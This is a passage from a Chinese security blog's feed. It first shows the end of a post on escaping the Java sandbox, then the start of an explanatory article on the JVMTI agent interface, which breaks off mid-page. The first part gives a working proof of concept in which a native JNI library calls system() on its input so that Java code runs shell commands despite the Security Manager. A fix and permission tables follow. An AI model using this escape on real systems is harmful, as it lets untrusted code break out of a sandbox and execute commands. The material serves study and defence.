com.evil.EvilMethodClass</span><br></pre></td></tr></table></figure><p>新建EvilMethodClass.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_evil_EvilMethodClass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_evil_EvilMethodClass_evilMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env, jclass cls, jstring j_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *c_str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (c_str == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"out of memory.n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在这里执行系统命令</span></span><br><span class="line">    system(c_str);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>编译，生成动态链接库，然后放到/root/目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so</span><br></pre></td></tr></table></figure><p>Poc.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        EvilMethodClass.evilMethod(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将Poc.java和EvilMethodClass.java一同打包成jar，然后在Kali中运行即可绕过Java Security Manager：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=my.policy -jar exp.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/21.png" alt=""></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>不授予loadLibrary权限。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cnblogs.com/MyStringIsNotNull/p/8268351.html" target="_blank" rel="noopener">java中的安全模型(沙箱机制)</a></p><p><a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">java沙箱绕过</a></p><p><a href="http://phrack.org/papers/escaping_the_java_sandbox.html" target="_blank" rel="noopener">Twenty years of Escaping the Java Sandbox</a></p><p><a href="https://xz.aliyun.com/t/2840" target="_blank" rel="noopener">Java沙箱逃逸走过的二十个春秋（一）</a></p><h2 id="0x05-附录"><a href="#0x05-附录" class="headerlink" title="0x05 附录"></a>0x05 附录</h2><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>accessClassInPackage.</td><td>允许代码访问指定包中的类</td></tr><tr><td>accessDeclaredMembers</td><td>允许代码使用反射访问其他类中私有或保护的成员</td></tr><tr><td>createClassLoader</td><td>允许代码实例化类加载器</td></tr><tr><td>createSecurityManager</td><td>允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制</td></tr><tr><td>defineClassInPackage.</td><td>允许代码在指定包中定义类</td></tr><tr><td>exitVM</td><td>允许代码关闭整个虚拟机</td></tr><tr><td>getClassLoader</td><td>允许代码访问类加载器以获得某个特定的类</td></tr><tr><td>getProtectionDomain</td><td>允许代码访问保护域对象以获得某个特定类</td></tr><tr><td>loadlibrary.</td><td>允许代码装载指定类库</td></tr><tr><td>modifyThread</td><td>允许代码调整指定的线程参数</td></tr><tr><td>modifyThreadGroup</td><td>允许代码调整指定的线程组参数</td></tr><tr><td>queuePrintJob</td><td>允许代码初始化一个打印任务</td></tr><tr><td>readFileDescriptor</td><td>允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的）</td></tr><tr><td>setContextClassLoader</td><td>允许代码为某线程设置上下文类加载器</td></tr><tr><td>setFactory</td><td>允许代码创建套接字工厂</td></tr><tr><td>setIO</td><td>允许代码重定向System.in、System.out或System.err输入输出流</td></tr><tr><td>setSecurityManager</td><td>允许代码设置安全管理器</td></tr><tr><td>stopThread</td><td>允许代码调用线程类的stop()方法</td></tr><tr><td>writeFileDescriptor</td><td>允许代码写文件描述符</td></tr></tbody></table><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>accessClipboard</td><td>允许访问系统的全局剪贴板</td></tr><tr><td>accessEventQueue</td><td>允许直接访问事件队列</td></tr><tr><td>createRobot</td><td>允许代码创建AWT的Robot类</td></tr><tr><td>listenToAllAWTEvents</td><td>允许代码直接监听事件分发</td></tr><tr><td>readDisplayPixels</td><td>允许AWT Robot读显示屏上的像素</td></tr><tr><td>showWindowWithoutWarningBanner</td><td>允许创建无标题栏的窗口</td></tr></tbody></table><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>specifyStreamHandler</td><td>允许在URL类中安装新的流处理器</td></tr><tr><td>setDefaultAuthenticator</td><td>可以安装鉴别类</td></tr><tr><td>requestPassworkAuthentication</td><td>可以完成鉴别</td></tr></tbody></table><h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>addIdentityCertificate</td><td>为Identity增加一个证书</td></tr><tr><td>clearProviderProperties.</td><td>针对指定的提供者，删除所有属性</td></tr><tr><td>createAccessControlContext</td><td>允许创建一个存取控制器的上下文环境</td></tr><tr><td>getDomainCombiner</td><td>允许撤销保护域</td></tr><tr><td>getPolicy</td><td>检索可以实现沙箱策略的类</td></tr><tr><td>getProperty.</td><td>读取指定的安全属性</td></tr><tr><td>getSignerPrivateKey</td><td>由Signer对象获取私有密钥</td></tr><tr><td>insertProvider.</td><td>将指定的提供者添加到响应的安全提供者组中</td></tr><tr><td>loadProviderProperties.</td><td>装载指定的提供者的属性</td></tr><tr><td>printIdentity</td><td>打印Identity类内容</td></tr><tr><td>putAllProviderProperties.</td><td>更新指定的提供者的属性</td></tr><tr><td>putProviderProperty.</td><td>为指定的提供者增加一个属性</td></tr><tr><td>removeIdentityCertificate</td><td>取消Identity对象的证书</td></tr><tr><td>removeProvider.</td><td>将指定的提供者从相应的安全提供者组中删除</td></tr><tr><td>removeProviderProperty.</td><td>删除指定的安全提供者的某个属性</td></tr><tr><td>setIdentityInfo</td><td>为某个Identity对象设置信息串</td></tr><tr><td>setIdentityPublicKey</td><td>为某个Identity对象设置公钥</td></tr><tr><td>setPolicy</td><td>设置可以实现沙箱策略的类</td></tr><tr><td>setProperty.</td><td>设置指定的安全属性</td></tr><tr><td>setSignerKeyPair</td><td>在Signer对象中设置密钥对</td></tr><tr><td>setSystemScope</td><td>设置系统所用的IdentityScope</td></tr></tbody></table><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><table><thead><tr><th>权限名</th><th>用途说明</th></tr></thead><tbody><tr><td>enableSubstitution</td><td>允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法</td></tr><tr><td>enableSubclassImplementation</td><td>允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="沙箱逃逸" scheme="https://www.mi1k7ea.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>浅谈JVMTI</title>
    <link href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E8%B0%88JVMTI/"/>
    <id>https://www.mi1k7ea.com/2020/05/03/浅谈JVMTI/</id>
    <published>2020-05-03T04:11:06.000Z</published>
    <updated>2020-05-03T07:59:05.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-JVMTI简介"><a href="#0x01-JVMTI简介" class="headerlink" title="0x01 JVMTI简介"></a>0x01 JVMTI简介</h2><p>JVMTI（JVM Tool Interface）是 Java 虚拟机所提供的 native 编程接口，是 JVMPI（Java Virtual Machine Profiler Interface）和 JVMDI（Java Virtual Machine Debug Interface）的更新版本。从这个 API 的发展历史轨迹中我们就可以知道，JVMTI 提供了可用于 debug 和 profiler 的接口；同时，在 Java 5/6 中，虚拟机接口也增加了监听（Monitoring），线程分析（Thread analysis）以及覆盖率分析（Coverage Analysis）等功能。正是由于 JVMTI 的强大功能，它是实现 Java 调试器，以及其它 Java 运行态测试与分析工具的基础。</p><p>JVMTI 并不一定在所有的 Java 虚拟机上都有实现，不同的虚拟机的实现也不尽相同。不过在一些主流的虚拟机中，比如 Sun 和 IBM，以及一些开源的如 Apache Harmony DRLVM 中，都提供了标准 JVMTI 实现。</p><p>JVMTI 是一套本地代码接口，因此使用 JVMTI 需要我们与 C/C++ 以及 JNI 打交道。事实上，开发时一般采用建立一个 Agent 的方式来使用 JVMTI，它使用 JVMTI 函数，设置一些回调函数，并从 Java 虚拟机中得到当前的运行态信息，并作出自己的判断，最后还可能操作虚拟机的运行态。把 Agent 编译成一个动态链接库之后，我们就可以在 Java 程序启动的时候来加载它（启动加载模式），也可以在 Java 5 之后使用运行时加载（活动加载模式）。</p><ul><li>-agentlib:agent-lib-name=options</li><li>-agentpath:path-to-agent=options</li></ul><p>注意：这里的 Agent 即 JVMTI 的客户端，它和执行 Java 程序的虚拟机运行在同一个进程上，因此通常他们的实现都很紧凑，他们通常由另一个独立的进程控制，充当这个独立进程和当前虚拟机之间的中介，通过调用 JVMTI 提供的接口和虚拟机交互，负责获取并返回当前虚拟机的状态或者转发控制命令。</p><h2 id="0x02-Agent的工作过程"><a href="#0x02-Agent的工作过程" class="headerlink" title="0x02 Agent的工作过程"></a>0x02 Agent的工作过程</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>Agent 是在 Java 虚拟机启动之时加载的，这个加载处于虚拟机初始化的早期，在这个时间点上：</p><ul><li>所有的 Java 类都未被初始化；</li><li>所有的对象实例都未被创建；</li><li>因而，没有任何 Java 代码被执行；</li></ul><p>但在这个时候，我们已经可以：</p><ul><li>操作 JVMTI 的 Capability 参数；</li><li>使用系统参数；</li></ul><p>动态库被加载之后，虚拟机会先寻找一个 Agent 入口函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">Agent_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">char</span> *options, <span class="keyword">void</span> *reserved)</span></span></span><br></pre></td></tr></table></figure><p>在这个函数中，虚拟机传入了一个 JavaVM 指针，以及命令行的参数。通过 JavaVM，我们可以获得 JVMTI 的指针，并获得 JVMTI 函数的使用能力，所有的 JVMTI 函数都通过这个 jvmtiEnv 获取，不同的虚拟机实现提供的函数细节可能不一样，但是使用的方式是统一的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jvmtiEnv *jvmti; </span><br><span class="line">(*jvm)-&gt;GetEnv(jvm, &amp;jvmti, JVMTI_VERSION_1_0);</span><br></pre></td></tr></table></figure><p>这里传入的版本信息参数很重要，不同的 JVMTI 环境所提供的功能以及处理方式都可能有所不同，不过它在同一个虚拟机中会保持不变（有心的读者可以去比较一下 JNI 环境）。命令行参数事实上就是上面启动命令行中的 options 部分，在 Agent 实现中需要进行解析并完成后续处理工作。参数传入的字符串仅仅在 Agent_OnLoad 函数里有效，如果需要长期使用，开发者需要做内存的复制工作，同时在最后还要释放这块存储。另外，有些 JDK 的实现会使用 JAVA_TOOL_OPTIONS 所提供的参数，这个常见于一些嵌入式的 Java 虚拟机（不使用命令行）。需要强调的是，这个时候由于虚拟机并未完成初始化工作，并不是所有的 JVMTI 函数都可以被使用。</p><p>Agent 还可以在运行时加载，如果您了解 Java Instrument 模块（可以参考<a href="http://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">这篇文章</a>），您一定对它的运行态加载有印象，这个新功能事实上也是 Java Agent 的一个实现。具体说来，虚拟机会在运行时监听并接受 Agent 的加载，在这个时候，它会使用 Agent 的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">Agent_OnAttach</span><span class="params">(JavaVM* vm, <span class="keyword">char</span> *options, <span class="keyword">void</span> *reserved)</span></span>;</span><br></pre></td></tr></table></figure><p>同样的在这个初始化阶段，不是所有的 JVMTI 的 Capability 参数都处于可操作状态，而且 options 这个 char 数组在这个函数运行之后就会被丢弃，如果需要，需要做好保留工作。</p><p>Agent 的主要功能是通过一系列的在虚拟机上设置的回调（callback）函数完成的，一旦某些事件发生，Agent 所设置的回调函数就会被调用，来完成特定的需求。</p><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>最后，Agent 完成任务，或者虚拟机关闭的时候，虚拟机都会调用一个类似于类析构函数的方法来完成最后的清理任务，注意这个函数和虚拟机自己的 VM_DEATH 事件是不同的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Agent_OnUnload</span><span class="params">(JavaVM *vm)</span></span></span><br></pre></td></tr></table></figure><h2 id="0x03-JVMTI的环境和错误处理"><a href="#0x03-JVMTI的环境和错误处理" class="headerlink" title="0x03 JVMTI的环境和错误处理"></a>0x03 JVMTI的环境和错误处理</h2><p>我们使用 JVMTI 的过程，主要是设置 JVMTI 环境，监听虚拟机所产生的事件，以及在某些事件上加上我们所希望的回调函数。</p><h3 id="JVMTI环境"><a href="#JVMTI环境" class="headerlink" title="JVMTI环境"></a>JVMTI环境</h3><p>我们可以通过操作 jvmtiCapabilities 来查询、增加、修改 JVMTI 的环境参数。当然，对于每一个不同的虚拟机来说，基于他们的实现不尽相同，导致了 JVMTI 的环境也不一定一致。标准的 jvmtiCapabilities 定义了一系列虚拟机的功能，比如 can_redefine_any_class 定义了虚拟机是否支持重定义类，can_retransform_classes 定义了是否支持在运行的时候改变类定义等等。如果熟悉 Java Instrumentation，一定不会对此感到陌生，因为 Instrumentation 就是对这些在 Java 层上的包装。对用户来说，这块最主要的是查看当前 JVMTI 环境，了解虚拟机具有的功能。要了解这个，其实很简单，只需通过对 jvmtiCapabilities 的一系列变量的考察就可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err = (*jvmti)-&gt;GetCapabilities(jvmti, &amp;capa); <span class="comment">// 取得 jvmtiCapabilities 指针。</span></span><br><span class="line"><span class="keyword">if</span> (err == JVMTI_ERROR_NONE) &#123;</span><br><span class="line">    <span class="keyword">if</span> (capa.can_redefine_any_class) &#123; ... &#125;</span><br><span class="line">&#125; <span class="comment">// 查看是否支持重定义类</span></span><br></pre></td></tr></table></figure><p>另外，虚拟机有自己的一些功能，一开始并未被启动，那么增加或修改 jvmtiCapabilities 也是可能的，但不同的虚拟机对这个功能的处理也不太一样，多数的虚拟机允许增改，但是有一定的限制，比如仅支持在 Agent_OnLoad 时，即虚拟机启动时作出，它某种程度上反映了虚拟机本身的构架。开发人员无需要考虑 Agent 的性能和内存占用，就可以在 Agent 被加载的时候启用所有功能：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">err = (*jvmti)-&gt;GetPotentialCapabilities(jvmti, &amp;capa); <span class="comment">// 取得所有可用的功能</span></span><br><span class="line"><span class="keyword">if</span> (err == JVMTI_ERROR_NONE) &#123;</span><br><span class="line">    err = (*jvmti)-&gt;AddCapabilities(jvmti, &amp;capa);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们要注意的是，JVMTI 的函数调用都有其时间性，即特定的函数只能在特定的虚拟机状态下才能调用，比如 SuspendThread（挂起线程）这个动作，仅在 Java 虚拟机处于运行状态（live phase）才能调用，否则导致一个内部异常。</p><h3 id="JVMTI错误处理"><a href="#JVMTI错误处理" class="headerlink" title="JVMTI错误处理"></a>JVMTI错误处理</h3><p>JVMTI 沿用了基本的错误处理方式，即使用返回的错误代码通知当前的错误，几乎所有的 JVMTI 函数调用都具有以下模式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvmtiError err = jvmti-&gt;someJVMTImethod (somePara … );</span><br></pre></td></tr></table></figure><p>其中 err 就是返回的错误代码，不同函数的错误信息可以在 Java 规范里查到。</p><h2 id="0x04-JVMTI基本功能"><a href="#0x04-JVMTI基本功能" class="headerlink" title="0x04 JVMTI基本功能"></a>0x04 JVMTI基本功能</h2><p>JVMTI 的功能非常丰富，包含了虚拟机中线程、内存 / 堆 / 栈，类 / 方法 / 变量，事件 / 定时器处理等等 20 多类功能，下面我们介绍一下，并举一些简单列子。</p><h3 id="事件处理和回调函数"><a href="#事件处理和回调函数" class="headerlink" title="事件处理和回调函数"></a>事件处理和回调函数</h3><p>从上文我们知道，使用 JVMTI 一个基本的方式就是设置回调函数，在某些事件发生的时候触发并作出相应的动作。因此这一部分的功能非常基本，当前版本的 JVMTI 提供了许多事件（Event）的回调，包括虚拟机初始化、开始运行、结束，类的加载，方法出入，线程始末等等。如果想对这些事件进行处理，我们需要首先为该事件写一个函数，然后在 jvmtiEventCallbacks 这个结构中指定相应的函数指针。比如，我们对线程启动感兴趣，并写了一个 HandleThreadStart 函数，那么我们需要在 Agent_OnLoad 函数里加入：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jvmtiEventCallbacks eventCallBacks;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ecbs, <span class="number">0</span>, <span class="keyword">sizeof</span>(ecbs)); <span class="comment">// 初始化</span></span><br><span class="line">eventCallBacks.ThreadStart = &amp;HandleThreadStart; <span class="comment">// 设置函数指针</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在设置了这些回调之后，就可以调用下述方法，来最终完成设置。在接下来的虚拟机运行过程中，一旦有线程开始运行发生，虚拟机就会回调 HandleThreadStart 方法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvmti-&gt;SetEventCallbacks(eventCallBacks, <span class="keyword">sizeof</span>(eventCallBacks));</span><br></pre></td></tr></table></figure><p>设置回调函数的时候，开发者需要注意以下几点：</p><ul><li>如同 Java 异常机制一样，如果在回调函数中自己抛出一个异常（Exception），或者在调用 JNI 函数的时候制造了一些麻烦，让 JNI 丢出了一个异常，那么任何在回调之前发生的异常就会丢失，这就要求开发人员要在处理错误的时候需要当心。</li><li>虚拟机不保证回调函数会被同步，换句话说，程序有可能同时运行同一个回调函数（比如，好几个线程同时开始运行了，这个 HandleThreadStart 就会被同时调用几次），那么开发人员在开发回调函数时需要处理同步的问题。</li></ul><h3 id="内存控制和对象获取"><a href="#内存控制和对象获取" class="headerlink" title="内存控制和对象获取"></a>内存控制和对象获取</h3><p>内存控制是一切运行态的基本功能。 JVMTI 除了提供最简单的内存申请和撤销之外（这块内存不受 Java 堆管理，开发人员需要自行进行清理工作，不然会造成内存泄漏），也提供了对 Java 堆的操作。众所周知，Java 堆中存储了 Java 的类、对象和基本类型（Primitive），通过对堆的操作，开发人员可以很容易的查找任意的类、对象，甚至可以强行执行垃圾收集工作。 JVMTI 中对 Java 堆的操作与众不同，它没有提供一个直接获取的方式（由此可见，虚拟机对对象的管理并非是哈希表，而是某种树 / 图方式），而是使用一个迭代器（iterater）的方式遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">FollowReferences</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jint heap_filter, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jclass klass, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jobject initial_object,<span class="comment">// 该方式可以指定根节点</span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> jvmtiHeapCallbacks* callbacks,<span class="comment">// 设置回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> <span class="keyword">void</span>* user_data)</span></span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">IterateThroughHeap</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jint heap_filter, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jclass klass, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> jvmtiHeapCallbacks* callbacks, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> <span class="keyword">void</span>* user_data)</span><span class="comment">// 遍历整个 heap</span></span></span><br></pre></td></tr></table></figure><p>在遍历的过程中，开发者可以设定一定的条件，比如，指定是某一个类的对象，并设置一个回调函数，如果条件被满足，回调函数就会被执行。开发者可以在回调函数中对当前传回的指针进行打标记（tag）操作——这又是一个特殊之处，在第一遍遍历中，只能对满足条件的对象进行 tag ；然后再使用 GetObjectsWithTags 函数，获取需要的对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetObjectsWithTags</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jint tag_count, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> jlong* tags, <span class="comment">// 设定特定的 tag，即我们上面所设置的</span></span></span></span><br><span class="line"><span class="function"><span class="params">                              jint* count_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jobject** object_result_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jlong** tag_result_ptr)</span></span></span><br></pre></td></tr></table></figure><p>如果你仅仅想对特定 Java 对象操作，应该避免设置其他类型的回调函数，否则会影响效率，举例来说，多增加一个 primitive 的回调函数，可能会使整个操作效率下降一个数量级。</p><h3 id="线程和锁"><a href="#线程和锁" class="headerlink" title="线程和锁"></a>线程和锁</h3><p>线程是 Java 运行态中非常重要的一个部分，在 JVMTI 中也提供了很多 API 进行相应的操作，包括查询当前线程状态，暂停，恢复或者终端线程，还可以对线程锁进行操作。开发者可以获得特定线程所拥有的锁：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetOwnedMonitorInfo</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">    jthread thread, </span></span></span><br><span class="line"><span class="function"><span class="params">    jint* owned_monitor_count_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">    jobject** owned_monitors_ptr)</span></span></span><br></pre></td></tr></table></figure><p>也可以获得当前线程正在等待的锁：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetCurrentContendedMonitor</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">    jthread thread, </span></span></span><br><span class="line"><span class="function"><span class="params">    jobject* monitor_ptr)</span></span></span><br></pre></td></tr></table></figure><p>知道这些信息，事实上我们也可以设计自己的算法来判断是否死锁。更重要的是，JVMTI 提供了一系列的监视器（Monitor）操作，来帮助我们在 native 环境中实现同步。主要的操作是构建监视器（CreateRawMonitor），获取监视器（RawMonitorEnter），释放监视器（RawMonitorExit），等待和唤醒监视器 (RawMonitorWait,RawMonitorNotify) 等操作，通过这些简单锁，程序的同步操作可以得到保证。</p><h2 id="0x05-JVMTI数据结构"><a href="#0x05-JVMTI数据结构" class="headerlink" title="0x05 JVMTI数据结构"></a>0x05 JVMTI数据结构</h2><p>JVMTI 中使用的数据结构，首先也是一些标准的 JNI 数据结构，比如 jint，jlong ；其次，JVMTI 也定义了一些基本类型，比如 jthread，表示一个 thread，jvmtiEvent，表示 jvmti 所定义的事件；更复杂的有 JVMTI 的一些需要用结构体表示的数据结构，比如堆的信息（jvmtiStackInfo）。这些数据结构在文档中都有清楚的定义，本文就不再详细解释。</p><h2 id="0x06-JVMTI应用场景"><a href="#0x06-JVMTI应用场景" class="headerlink" title="0x06 JVMTI应用场景"></a>0x06 JVMTI应用场景</h2><h3 id="对class文件加密"><a href="#对class文件加密" class="headerlink" title="对class文件加密"></a>对class文件加密</h3><p>有时一些涉及到关键技术的class文件或者jar包我们不希望对外暴露，因而需要进行加密。使用一些常规的手段（例如使用混淆器或者自定义类加载器）来对class文件进行加密很容易被反编译。反编译后的代码虽然增加了阅读的难度，但花费一些功夫也是可以读懂的。</p><p>JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。</p><p>具体的实例可参考：<a href="/2020/05/01/Java代码反反编译思路/">《Java代码反反编译对抗思路》</a></p><h3 id="实现应用性能监控-APM"><a href="#实现应用性能监控-APM" class="headerlink" title="实现应用性能监控(APM)"></a>实现应用性能监控(APM)</h3><p>在微服务大行其道的环境下，分布式系统的逻辑结构变得越来越复杂。这给系统性能分析和问题定位带来了非常大的挑战。基于JVMTI的APM能够解决分布式架构和微服务带来的监控和运维上的挑战。APM通过汇聚业务系统各处理环节的实时数据，分析业务系统各事务处理的交易路径和处理时间，实现对应用的全链路性能监测。开源的Pinpoint, ZipKin, Hawkular,商业的AppDynamics，OneAPM，Google Dapper等都是个中好手。</p><h3 id="产品运行时错误监测及调试"><a href="#产品运行时错误监测及调试" class="headerlink" 